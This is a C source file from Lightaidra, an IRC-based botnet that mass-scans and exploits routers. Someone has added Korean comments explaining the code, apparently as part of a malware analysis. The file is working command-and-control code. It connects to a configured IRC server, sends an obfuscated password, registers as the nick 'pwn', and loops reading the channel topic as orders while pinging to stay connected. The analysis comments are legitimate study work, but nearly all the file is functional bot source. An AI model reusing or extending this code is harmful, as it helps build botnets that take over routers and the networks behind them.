// UTF-8 인코딩

/*
 * irc.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

char *getrstr();
int sockwrite(int sd, const char *fmt, ...);
int irc_requests(sock_t * sp, requests_t * req);
int pub_requests(sock_t * sp, requests_t * req);

/* connect_to_irc(sock_t *) */
/* make an irc connection.  */
int connect_to_irc(sock_t *sp) {
    int ps = 0, port = 0;
    requests_t *req;
    char *token, srv[32];

	//isrv[counter]을 Tokenize한다.
    
    memset(srv, 0, sizeof srv);
    token = strtok(isrv[counter], ":");
    while (token != NULL) {
        if (!ps) {
            strncpy(srv, token, sizeof(srv)-1);
            ps++;
        }
        else {
            port = atoi(token);
        }

        token = strtok(NULL, ":");
    }

	/*.맨 처음의 토큰은 srv에 그 값을 복사하고 ps를 1 증가시킨다.
	port에는 마지막 토큰의 값이 int형으로 들어감
	위의 srv의 이름을 갖는 호스트를 sp->sockhs에 넣고
	sp->sockfd 는 IPv4와 TCP / IP를 사용한다는 소켓값을 입력한다.
	socketadd 에는 IPv4 주소체계와
	host 변수의 네트워크 바이트 데이터, 그리고 sockhs의 ip주소가 들어가게된다.
	sin_zero에는 널값을 가득 채운다.*/
    
    sp->sockfd = false;
    if (!(sp->sockhs = gethostbyname(srv))) return EXIT_FAILURE;
    sp->sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sp->sockadr.sin_family = AF_INET;
    sp->sockadr.sin_port = htons(port);
    sp->sockadr.sin_addr = *((struct in_addr *)sp->sockhs->h_addr);

    memset(sp->sockadr.sin_zero, '\0', sizeof sp->sockadr.sin_zero);

    if (connect(sp->sockfd, (struct sockaddr *)&sp->sockadr, sizeof sp->sockadr) == false)
        return EXIT_FAILURE;

	/*생성한 소켓을 통해 서버로 접속을 요청하고
	디코딩 한다. 이 아래로는 추가 분석 후 작성 바람.*/

    getrstr();
    snprintf(channel, sizeof(channel)-1, "%s", irc_chan);
    snprintf(nt, 3, "->%s", nctype);

    /* IRCD PASSWORD FOR MODDED SERVER/CLIENT WITH REPLACED PASS/local */
    if (encirc != 0) {
        decode(enc_passwd, 1);
        if (sockwrite(sp->sockfd, "%s %s\n", passproto, decodedpsw)) 
            return EXIT_FAILURE;
    } 
    else {
        if (sockwrite(sp->sockfd, "%s %s\n", passproto, irc_passwd)) 
            return EXIT_FAILURE;
    }

    if (sockwrite(sp->sockfd, "NICK %s\n", data_ptr))
        return EXIT_FAILURE;
    
    if (sockwrite(sp->sockfd, "USER pwn localhost localhost :Lightaidra ;)\n"))
        return EXIT_FAILURE;

    req = (requests_t *) malloc(sizeof(requests_t));

    if (irc_requests(sp, req)) {
        free(req);
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

/* irc_requests(sock_t *, requests_t *) */
/* manage the requests.                 */
int irc_requests(sock_t *sp, requests_t *req) {
    if (max_pids > 0) kill(g_pid, 9);

    stop = 0;
    max_pids = 0;
    login_status = false;
    srchost = 0;

    for (;;) {
        while ((pid = waitpid(-1, &pid_status, WNOHANG)) > 0) max_pids = 0;

        if (max_pids == 0 && stop == 0) {
            sleep(2);
            sockwrite(sp->sockfd, "TOPIC %s\n", channel);
        }

        /* stay alive in irc when operating started. */
        /* to prevent the connection reset           */
        if (max_pids > 0) {
            sleep(4);
            cmd_ping(sp);
        }

        memset(netbuf, 0, sizeof netbuf);
        recv_bytes = recv(sp->sockfd, netbuf, sizebuf - 1, 0);

        if (recv_bytes == true) return EXIT_FAILURE;
        netbuf[recv_bytes] = 0;
            
        if (background_mode) {
            puts(netbuf);
            fflush(stdout);
        }

        if (pub_requests(sp, req)) return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

/*  "requests.c"파일에있는 cmd_ping () 함수를 사용하여 서버와 지속적으로 연결하는 함수(연결 리셋을 방지하기 위해) IRC에 연결된 악성코드가 채널에 설정된 TOPIC을 읽는다 */
/* (추가설명필요) */

